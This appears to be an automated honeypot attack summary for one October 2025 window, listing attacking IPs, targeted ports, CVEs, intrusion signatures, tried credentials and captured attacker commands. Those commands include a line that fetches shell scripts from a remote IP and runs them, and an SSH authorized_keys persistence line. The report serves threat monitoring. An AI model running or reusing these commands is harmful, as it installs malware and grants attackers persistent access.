
# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-09T11:01:22Z
**Timeframe:** 2025-10-09T10:20:01Z to 2025-10-09T11:00:01Z
**Files Used:** `agg_log_20251009T102001Z.json`, `agg_log_20251009T104001Z.json`, `agg_log_20251009T110001Z.json`

## Executive Summary

This report summarizes 24,509 events collected from three honeypot log files over a period of approximately 40 minutes. The majority of attacks were captured by the Cowrie, Suricata, and Honeytrap honeypots. A significant number of attacks originated from the IP address `167.250.224.25`. The most frequently targeted ports were VNC (5900) and TCP/445. Several CVEs were detected, with the most common being related to VNC and DoublePulsar. Attackers were observed attempting to add their SSH keys to the authorized_keys file for persistent access.

## Detailed Analysis

### Attacks by Honeypot
- Cowrie: 11085
- Suricata: 5764
- Heralding: 1497
- Honeytrap: 2714
- Ciscoasa: 1553
- Sentrypeer: 572
- Redishoneypot: 98
- Mailoney: 876
- Dionaea: 64
- H0neytr4p: 27
- Tanner: 195
- Adbhoney: 15
- ConPot: 7
- Honeyaml: 14
- ElasticPot: 1
- Ipphoney: 1
- Miniprint: 26

### Top Attacking IPs
- 167.250.224.25: 4096
- 188.253.1.20: 1494
- 103.146.202.84: 1244
- 10.208.0.3: 1179
- 196.188.243.243: 1664
- 86.54.42.238: 821
- 198.186.131.155: 1438
- 103.211.9.100: 832
- 78.31.71.38: 565
- 80.94.95.238: 555
- 194.233.95.67: 312
- 14.29.198.130: 183

### Top Targeted Ports/Protocols
- vnc/5900: 1494
- TCP/445: 2488
- 22: 1925
- 5060: 572
- 25: 863
- 80: 189
- 5903: 194
- 6379: 98

### Most Common CVEs
- CVE-2002-0013 CVE-2002-0012
- CVE-2019-11500 CVE-2019-11500
- CVE-2021-3449 CVE-2021-3449
- CVE-2002-0013 CVE-2002-0012 CVE-1999-0517
- CVE-2006-2369
- CVE-2009-2765
- CVE-2016-6563
- CVE-2024-4577 CVE-2024-4577
- CVE-2024-4577 CVE-2002-0953
- CVE-2021-41773 CVE-2021-41773 CVE-2021-41773 CVE-2021-41773
- CVE-2021-42013 CVE-2021-42013

### Commands Attempted by Attackers
- cd ~; chattr -ia .ssh; lockr -ia .ssh
- lockr -ia .ssh
- cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa ...\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
- cat /proc/cpuinfo | grep name | wc -l
- Enter new UNIX password: 
- free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
- ls -lh $(which ls)
- crontab -l
- uname -a
- whoami
- lscpu | grep Model
- df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
- cd /data/local/tmp/; busybox wget http://141.98.10.66/bins/w.sh; sh w.sh; curl http://141.98.10.66/bins/c.sh; sh c.sh

### Signatures Triggered
- ET INFO VNC Authentication Failure
- ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication
- ET DROP Dshield Block Listed Source group 1
- ET SCAN MS Terminal Server Traffic on Non-standard Port
- ET SCAN NMAP -sS window 1024
- ET SCAN Potential SSH Scan
- ET SCAN Suspicious inbound to PostgreSQL port 5432
- ET HUNTING RDP Authentication Bypass Attempt
- ET INFO Reserved Internal IP Traffic
- ET CINS Active Threat Intelligence Poor Reputation IP group 43
- ET WEB_SERVER Possible HTTP 404 XSS Attempt (Local Source)
- ET DROP Spamhaus DROP Listed Traffic Inbound group 28
- ET VOIP Possible Inbound VOIP Scan/Misuse With User-Agent Zoiper
- ET VOIP Modified Sipvicious Asterisk PBX User-Agent
- ET INFO CURL User Agent

### Users / Login Attempts
- 345gs5662d34/345gs5662d34
- /power123
- /qazwsxed
- user/123456789123456789
- operator/0987654321
- centos/centos6
- support/77
- user/1961
- root/admin@2024
- root/asterisk!
- root/call!
- root/ipbx!12345

### Files Uploaded/Downloaded
- 11
- fonts.gstatic.com
- css?family=Libre+Franklin...
- ie8.css?ver=1.0
- html5.js?ver=3.7.3
- Mozi.m
- parm;
- sh
- rondo.naz.sh|sh&...

### HTTP User-Agents
- No HTTP User-Agents were recorded in the logs.

### SSH Clients and Servers
- No SSH clients or servers were recorded in the logs.

### Top Attacker AS Organizations
- No attacker AS organizations were recorded in the logs.

## Key Observations and Anomalies
- A large number of VNC authentication failures were observed, indicating brute-force attacks targeting VNC servers.
- The presence of the DoublePulsar backdoor communication signature suggests that some attackers are attempting to exploit systems with this implant.
- Attackers are consistently attempting to add their SSH key to the `authorized_keys` file, which is a common technique for maintaining persistent access to a compromised system.
- The `Mozi.m` file download is associated with the Mozi botnet, an IoT botnet that has been active for several years.
- The command `cd /data/local/tmp/; busybox wget http://141.98.10.66/bins/w.sh; sh w.sh; curl http://141.98.10.66/bins/c.sh; sh c.sh` is a clear indication of an attempt to download and execute a malicious script from a remote server.
